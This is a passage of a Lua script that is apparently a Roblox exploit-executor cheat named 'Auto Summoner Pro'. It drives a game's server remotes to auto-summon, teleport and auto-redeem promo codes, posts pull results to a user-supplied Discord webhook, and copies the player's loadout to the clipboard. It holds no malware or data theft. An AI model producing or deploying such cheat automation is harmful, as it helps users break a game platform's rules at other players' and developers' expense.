                        { name = "Unit", value = "**" .. tostring(unitName) .. "**", inline = true },
                        { name = "Rarity", value = "**" .. ((isShiny and "Shiny " or "") .. rarity) .. "**", inline = true },
                        { name = "Banner", value = tostring(bannerName), inline = true },
                        { name = "Player", value = LocalPlayer.Name, inline = true },
                        { name = "Total Pulls", value = tostring(currentSessionPulls), inline = true }
                    },
                    footer = { text = "Auto Summoner Pro • " .. os.date("%X") }
                }}
            })
        })
    end)
end

TestWebhookBtn.MouseButton1Click:Connect(function()
    webhookUrlInput = WebhookBox.Text
    if webhookUrlInput == "" or not webhookUrlInput:find("http") then
        TestWebhookBtn.Text = "INVALID"; TestWebhookBtn.BackgroundColor3 = currentTheme.Danger
        task_wait(1.5); TestWebhookBtn.Text = "TEST"; TestWebhookBtn.BackgroundColor3 = currentTheme.Accent
        return
    end
    sendDiscordWebhook(webhookUrlInput, "Flame Emperor", "Mythic", true, selectedBanner)
    TestWebhookBtn.Text = "SENT!"; TestWebhookBtn.BackgroundColor3 = currentTheme.Success
    task_wait(1.5); TestWebhookBtn.Text = "TEST"; TestWebhookBtn.BackgroundColor3 = currentTheme.Accent
end)

-- TAB 3: 📌 TELEPORTS & TOOLS
local TeleportTitle = createLabel(TabFrameTools, UDim2.new(1, 0, 0, 16), UDim2.new(0, 0, 0, 0), "📌 INSTANT LOBBY TELEPORTS:", currentTheme.SubText, Enum.Font.GothamBold, 10)
local TeleportRow1 = createFrame(TabFrameTools, UDim2.new(1, 0, 0, 32), UDim2.new(0, 0, 0, 20), Color3.fromRGB(0,0,0), 1)
local TeleportRow2 = createFrame(TabFrameTools, UDim2.new(1, 0, 0, 32), UDim2.new(0, 0, 0, 56), Color3.fromRGB(0,0,0), 1)

local function createTpCard(text, posScale, widthScale, areaName, parentRow)
    local btn = createButton(parentRow, UDim2.new(widthScale, -3, 1, 0), UDim2.new(posScale, 0, 0, 0), text, currentTheme.CardBg, currentTheme.Text, 11)
    applyCorner(btn, 8)
    applyStroke(btn, currentTheme.Stroke, 1)
    btn.MouseButton1Click:Connect(function() pcall(function() Nodes.TELEPORT_TO_AREA:FireServer(areaName) end) end)
    return btn
end

createTpCard("🔮 Summon Platform", 0, 0.5, "Summon", TeleportRow1)
createTpCard("💤 AFK Chamber", 0.5, 0.5, "AFKChamber", TeleportRow1)
createTpCard("🏠 Spawn Area", 0, 0.5, "Spawn", TeleportRow2)
createTpCard("🛠️ Crafting Bench", 0.5, 0.5, "Crafting", TeleportRow2)

-- Hotbar Loadout Exporter
local statPotentialInfo = Information.StatPotential and Information.StatPotential.Stats or {}
local equipmentTemplates = Information.Equipment and Information.Equipment.Info or {}

local function calculateStatValue(statType, potential, range)
    local info = statPotentialInfo[statType] and statPotentialInfo[statType][potential]
    if not info or not info.Multiplier then return 0 end
    return info.Multiplier[1] + (info.Multiplier[2] - info.Multiplier[1]) * (range or 0)
end

local function getRarityFromRange(val)
    if val >= 0.75 then return "Mythic"
    elseif val >= 0.50 then return "Legendary"
    elseif val >= 0.25 then return "Epic"
    else return "Rare" end
end

local statNamesMap = { Damage = "Damage", Range = "Range", SPA = "SPA", Magical = "Magical DMG Dealt", Physical = "Physical DMG Dealt", CritChance = "Critical Chance", CritDamage = "Critical Damage" }

local function buildHotbarLoadoutString()
    local replica = getReplica()
    if not replica or not replica.Data then return "Error: Failed to fetch replica data." end
    local hotbar, unitData, equipmentData = replica.Data.HotbarData or {}, replica.Data.UnitData or {}, replica.Data.EquipmentData or {}
    local lines = {"⚔️ Hotbar Loadout"}

    for slot = 1, 6 do
        local uUUID = hotbar[tostring(slot)]
        if uUUID and unitData[uUUID] then
            local u = unitData[uUUID]
            local assetName = u.Asset or uUUID:split("#")[1]
            local uTemplate = Information.Units and Information.Units[assetName]
            local displayName = (uTemplate and uTemplate.DisplayName) or assetName
            local subtitle = u.SubTitle or (uTemplate and uTemplate.SubTitle)

            table.insert(lines, string.format("Slot %d • %s%s", slot, displayName, (subtitle and subtitle ~= "") and string.format(" (%s)", subtitle) or ""))
            table.insert(lines, "Trait: " .. tostring(u.Trait or "None"))

            local pot = u.StatPotential or {}
            local dmgP, spaP, rngP = pot.Damage and pot.Damage.Potential or "C", pot.SPA and pot.SPA.Potential or "C", pot.Range and pot.Range.Potential or "C"
            local dmgVal, spaVal, rngVal = calculateStatValue("Damage", dmgP, pot.Damage and pot.Damage.Range), calculateStatValue("SPA", spaP, pot.SPA and pot.SPA.Range), calculateStatValue("Range", rngP, pot.Range and pot.Range.Range)

            table.insert(lines, string.format("Potential: DMG %s (%s%.1f%%) • SPA %s (%s%.1f%%) • RANGE %s (%s%.1f%%)",
                dmgP, (dmgVal >= 0) and "+" or "", dmgVal,
                spaP, (spaVal >= 0) and "+" or "", spaVal,
                rngP, (rngVal >= 0) and "+" or "", rngVal
            ))

            local equipTable = u.Equipment
            if equipTable and type(equipTable) == "table" and next(equipTable) then
                local equipLines = {}
                for eSlot = 1, 3 do
                    local eUUID = equipTable[tostring(eSlot)] or equipTable[eSlot]
                    if eUUID and equipmentData[eUUID] then
                        local eData = equipmentData[eUUID]
                        local eAssetName = eData.Asset or eUUID:split("#")[1]
                        local eTemplate = equipmentTemplates[eAssetName]
                        table.insert(equipLines, (eTemplate and eTemplate.DisplayName) or eAssetName)

                        local rawStats, tStats = eData.Stats or {}, eTemplate and eTemplate.Stats or {}
                        for idx, statObj in ipairs(rawStats) do
                            local valFraction = statObj.Value or 0
                            local tInfo = tStats[idx]
                            if tInfo and tInfo.Values and tInfo.Values[1] then
                                local sType = tInfo.Types and tInfo.Types[1] or "Damage"
                                local finalVal = tInfo.Values[1].Min + (tInfo.Values[1].Max - tInfo.Values[1].Min) * valFraction
                                table.insert(equipLines, string.format("%s%.2f%% %s — %s roll", (finalVal >= 0) and "+" or "", finalVal, statNamesMap[sType] or sType, getRarityFromRange(valFraction)))
                            end
                        end
                        for _, passiveObj in ipairs(eData.Passives or {}) do
                            local pVals = passiveObj.Values or {}
                            if #pVals > 0 then
                                local formatted, sumVal = {}, 0
                                for _, v in ipairs(pVals) do table.insert(formatted, string.format("%g%%", v * 100)); sumVal += v end
                                table.insert(equipLines, string.format("Passive effects: %s — %s roll", table.concat(formatted, " • "), getRarityFromRange(sumVal / #pVals)))
                            end
                        end
                    end
                end
                table.insert(lines, "Equipment:")
                for _, el in ipairs(equipLines) do table.insert(lines, el) end
            else
                table.insert(lines, "Equipment: None")
            end
            table.insert(lines, "")
        else
            table.insert(lines, string.format("Slot %d • Empty\nEquipment: None\n", slot))
        end
    end
    return table.concat(lines, "\n")
end

local CopyLoadoutBtn = createButton(TabFrameTools, UDim2.new(1, 0, 0, 36), UDim2.new(0, 0, 0, 96), "📋 COPY HOTBAR LOADOUT TO CLIPBOARD", currentTheme.Accent, currentTheme.AccentText, 11)
applyCorner(CopyLoadoutBtn, 8)

CopyLoadoutBtn.MouseButton1Click:Connect(function()
    local loadoutText = buildHotbarLoadoutString()
    pcall(function()
        if setclipboard then setclipboard(loadoutText)
        elseif toclipboard then toclipboard(loadoutText) end
    end)
    CopyLoadoutBtn.Text = "✅ LOADOUT COPIED TO CLIPBOARD!"; CopyLoadoutBtn.BackgroundColor3 = currentTheme.Success
    task_wait(2)
    CopyLoadoutBtn.Text = "📋 COPY HOTBAR LOADOUT TO CLIPBOARD"; CopyLoadoutBtn.BackgroundColor3 = currentTheme.Accent
end)

local ToolsTitle = createLabel(TabFrameTools, UDim2.new(1, 0, 0, 16), UDim2.new(0, 0, 0, 138), "🔑 PROMOTIONS & QUICK EXIT:", currentTheme.SubText, Enum.Font.GothamBold, 10)

local RedeemCodesBtn = createButton(TabFrameTools, UDim2.new(1, 0, 0, 36), UDim2.new(0, 0, 0, 156), "🔑 AUTO-REDEEM ALL CODES (2s Cooldown)", currentTheme.Purple, Color3.fromRGB(255, 255, 255), 11)
applyCorner(RedeemCodesBtn, 8)

local isRedeemingCodes = false
RedeemCodesBtn.MouseButton1Click:Connect(function()
    if isRedeemingCodes then return end
    isRedeemingCodes = true
    local codeList = {"30klikes!", "happybdaycoop", "sorryforguilds", "ea", "expeditions", "ea+", "release", "ae#1", "100k!", "sorryforbugs"}
    pcall(function()
        if Information.Codes and Information.Codes.Codes then
            for cName in pairs(Information.Codes.Codes) do
                if not table.find(codeList, cName) then table.insert(codeList, cName) end
            end
        end
    end)
    RedeemCodesBtn.BackgroundColor3 = currentTheme.Gold
    task_spawn(function()
        local redeemedCount = 0
        for i, code in ipairs(codeList) do
            RedeemCodesBtn.Text = string_format("⏳ REDEEMING (%d/%d): %s", i, #codeList, code)
            local req = Nodes.CLAIM_CODE:Request(code)
            if req and req.Timeout then req:Timeout(3); pcall(function() req:Wait() end) end
            redeemedCount += 1; task_wait(2)
        end
        RedeemCodesBtn.Text = string_format("✅ CODES PROCESSED (%d)!", redeemedCount); RedeemCodesBtn.BackgroundColor3 = currentTheme.Success
        task_wait(2)
        RedeemCodesBtn.Text = "🔑 AUTO-REDEEM ALL CODES (2s Cooldown)"; RedeemCodesBtn.BackgroundColor3 = currentTheme.Purple
        isRedeemingCodes = false
    end)
end)

local DotaBtn = createButton(TabFrameTools, UDim2.new(1, 0, 0, 36), UDim2.new(0, 0, 0, 198), "🎮 QUIT ROBLOX & LAUNCH DOTA 2", currentTheme.Danger, Color3.fromRGB(255, 255, 255), 11)
applyCorner(DotaBtn, 8)

DotaBtn.MouseButton1Click:Connect(function()
    pcall(function() if setclipboard then setclipboard("steam://run/570") end end)
    task_spawn(function() task_wait(0.2); game:Shutdown() end)
end)

-- Dynamic Theme Manager
applyThemeToUI = function(theme)
    currentTheme = theme
    tween(MainFrame, { BackgroundColor3 = theme.MainBg, BackgroundTransparency = theme.MainTrans })
    tween(TopBar, { BackgroundColor3 = theme.TopBarBg, BackgroundTransparency = theme.TopBarTrans })
    tween(CloseBtn, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans, TextColor3 = theme.SubText })
    tween(CloseBtnStroke, { Color = theme.Stroke })
    tween(TitleLabel, { TextColor3 = theme.Text })

    ThemeToggleBtn.Text = (theme == Themes.Light) and "☀️ Light RGB" or "🌙 Dark Glass"
    tween(ThemeToggleBtn, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans, TextColor3 = theme.Text })
    tween(ThemeStroke, { Color = theme.Stroke })

    if theme.HasRgb then
        UIStroke.Color = Color3.fromRGB(255, 255, 255)
        OpenStroke.Color = Color3.fromRGB(255, 255, 255)
    else
        tween(UIStroke, { Color = theme.Stroke })
        tween(OpenStroke, { Color = theme.Stroke })
    end

    tween(NavigationBar, { BackgroundColor3 = theme.TopBarBg, BackgroundTransparency = theme.TopBarTrans })
    for key, btn in pairs(TabButtons) do
        local isTarget = (key == currentTabKey)
        tween(btn, { BackgroundColor3 = isTarget and theme.Accent or theme.CardBg, BackgroundTransparency = isTarget and 0 or theme.CardTrans, TextColor3 = isTarget and theme.AccentText or theme.SubText })
    end

    tween(BannerTitle, { TextColor3 = theme.SubText })
    tween(BannerDropdown, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans, TextColor3 = theme.Text })
    tween(DropStroke, { Color = theme.Stroke })
    tween(BannerListFrame, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.MainTrans })
    tween(ListStroke, { Color = theme.Stroke })

    tween(AnimToggleBtn, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans, TextColor3 = theme.Text })
    tween(AnimToggleStroke, { Color = theme.Stroke })
    tween(StatsFrame, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans })
    tween(StatsStroke, { Color = theme.Stroke })
    tween(SecretPityLabel, { TextColor3 = theme.Purple })
    tween(MythicPityLabel, { TextColor3 = theme.Gold })
    tween(StatusLabel, { TextColor3 = theme.SubText })
    tween(CurrencyLabel, { TextColor3 = theme.Text })

    tween(WebhookFrame, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans })
    tween(WebhookStroke, { Color = theme.Stroke })
    tween(WebhookBox, { PlaceholderColor3 = theme.SubText, TextColor3 = theme.Text })
    tween(TestWebhookBtn, { BackgroundColor3 = theme.Accent, TextColor3 = theme.AccentText })
    tween(LogTitle, { TextColor3 = theme.SubText })
    tween(DropLogFrame, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans })
    tween(LogStroke, { Color = theme.Stroke })

    tween(TeleportTitle, { TextColor3 = theme.SubText })
    tween(ToolsTitle, { TextColor3 = theme.SubText })
    tween(WatermarkLabel, { TextColor3 = theme.SubText })

    for _, row in ipairs({TeleportRow1, TeleportRow2}) do
        for _, child in ipairs(row:GetChildren()) do
            if child:IsA("TextButton") then
                tween(child, { BackgroundColor3 = theme.CardBg, BackgroundTransparency = theme.CardTrans, TextColor3 = theme.Text })
                local strk = child:FindFirstChildOfClass("UIStroke")
                if strk then tween(strk, { Color = theme.Stroke }) end
            end
        end
    end

    tween(CopyLoadoutBtn, { BackgroundColor3 = theme.Accent, TextColor3 = theme.AccentText })
    tween(RedeemCodesBtn, { BackgroundColor3 = theme.Purple })
    tween(DotaBtn, { BackgroundColor3 = theme.Danger })
end

ThemeToggleBtn.MouseButton1Click:Connect(function()
    applyThemeToUI((currentTheme == Themes.Dark) and Themes.Light or Themes.Dark)
end)

local function updateCurrencyState()
    local isEnough, totalCost, currentBalance, currencyName, costPerPull, maxAffordablePulls, optimalPulls = getOptimalSummonAmount()
    if isEnough then
        CurrencyLabel.Text = string_format("Balance: %s %s | Auto-Pull: x%d (%s %s)", tostring(currentBalance), currencyName, optimalPulls, tostring(totalCost), currencyName)
    else
        CurrencyLabel.Text = string_format("Balance: %s %s | Cost (x1): %s %s", tostring(currentBalance), currencyName, tostring(costPerPull), currencyName)
    end
    CanOpenLabel.Text = string_format("🎫 Can Open: %s pulls (%s)", tostring(maxAffordablePulls), currencyName)

    local nowSummonCount = getBannerTotalSummonCount(selectedBanner)
    if initialBannerSummonCount == 0 then initialBannerSummonCount = nowSummonCount end
    currentSessionPulls = math_max(0, nowSummonCount - initialBannerSummonCount)

    local maxPity, currentPity = getPityData(selectedBanner)

    SecretPityLabel.Text = maxPity.Secret and string_format("🔮 Until Secret Pity: %d pulls (%d/%d)", math_max(0, maxPity.Secret - (currentPity.Secret or 0)), currentPity.Secret or 0, maxPity.Secret) or "🔮 Until Secret Pity: N/A (No Secret Pity)"
    MythicPityLabel.Text = maxPity.Mythic and string_format("🌟 Until Mythic Pity: %d pulls (%d/%d)", math_max(0, maxPity.Mythic - (currentPity.Mythic or 0)), currentPity.Mythic or 0, maxPity.Mythic) or "🌟 Until Mythic Pity: N/A"

    if not isEnough then
        if isAutoSummoning then
            isAutoSummoning = false
            StatusLabel.Text = string_format("⚠️ STOPPED: Out of %s (%s/%s) | Total: %d", currencyName, tostring(currentBalance), tostring(costPerPull), currentSessionPulls)
            StatusLabel.TextColor3 = currentTheme.Danger
        end
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 190, 205); ToggleBtn.Text = "⛔ NOT ENOUGH CURRENCY"; ToggleBtn.AutoButtonColor = false
    else
        ToggleBtn.AutoButtonColor = true
        if not isAutoSummoning then
            ToggleBtn.BackgroundColor3 = currentTheme.Success; ToggleBtn.Text = "▶ START AUTO SUMMON"
            StatusLabel.Text = string_format("Status: Idle | Total: %d", currentSessionPulls); StatusLabel.TextColor3 = currentTheme.SubText
        else
            ToggleBtn.BackgroundColor3 = currentTheme.Danger; ToggleBtn.Text = "⏸ STOP AUTO SUMMON"
            StatusLabel.Text = string_format("Status: Dynamic Pulling x%d (%s)... | Total: %d", optimalPulls, selectedBanner, currentSessionPulls); StatusLabel.TextColor3 = currentTheme.Success
        end
    end
    return isEnough, optimalPulls
end

local function renderBannerButtons()
    for _, child in pairs(BannerListFrame:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    updateBannerList()
    local totalHeight = 0
    for _, bName in ipairs(activeBanners) do
        local isSel = (bName == selectedBanner)
        local bBtn = createButton(BannerListFrame, UDim2.new(1, -6, 0, 30), nil, bName, isSel and currentTheme.Accent or currentTheme.CardBg, isSel and currentTheme.AccentText or currentTheme.Text, 12, Enum.Font.GothamMedium)
        bBtn.BackgroundTransparency = isSel and 0 or currentTheme.CardTrans
        bBtn.ZIndex = 51
        applyCorner(bBtn, 6)

        bBtn.MouseButton1Click:Connect(function()
            selectedBanner = bName
            BannerDropdown.Text = "Banner: " .. selectedBanner .. " ▼"
            BannerListFrame.Visible = false
            resetSessionCounter(); renderBannerButtons(); updateCurrencyState()
        end)
        totalHeight += 33
    end
    BannerListFrame.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
end

renderBannerButtons()
BannerDropdown.MouseButton1Click:Connect(function() renderBannerButtons(); BannerListFrame.Visible = not BannerListFrame.Visible end)

ToggleBtn.MouseButton1Click:Connect(function()
    local isEnough = updateCurrencyState()
    if not isEnough then return end
    isAutoSummoning = not isAutoSummoning
    if isAutoSummoning then
        if skipAnimation then pcall(function() Nodes.CHANGE_SETTING:FireServer("FastSummon", true) end) end
        ToggleBtn.BackgroundColor3 = currentTheme.Danger; ToggleBtn.Text = "⏸ STOP AUTO SUMMON"
        task_spawn(function()
            while isAutoSummoning do
                local canSummon, _, _, _, _, _, pullAmount = getOptimalSummonAmount()
                if not canSummon or pullAmount <= 0 then
                    isAutoSummoning = false; updateCurrencyState(); break
                end
                Nodes.BANNER_SUMMON:FireServer(selectedBanner, pullAmount)
                updateCurrencyState()
                task_wait(skipAnimation and 0.12 or 0.5)
            end
        end)
    else
        ToggleBtn.BackgroundColor3 = currentTheme.Success; ToggleBtn.Text = "▶ START AUTO SUMMON"
        updateCurrencyState()
    end
end)

pcall(function() Nodes.CLIENT_BANNER_REPLICA_LOADED:Connect(function() updateBannerList(); updateCurrencyState() end) end)
task_spawn(function()
    while ScreenGui.Parent do
        if isAutoSummoning then updateCurrencyState() end
        task_wait(0.5)
    end
end)

switchTab("Summon")
applyThemeToUI(Themes.Dark)
ScreenGui.Parent = PlayerGui
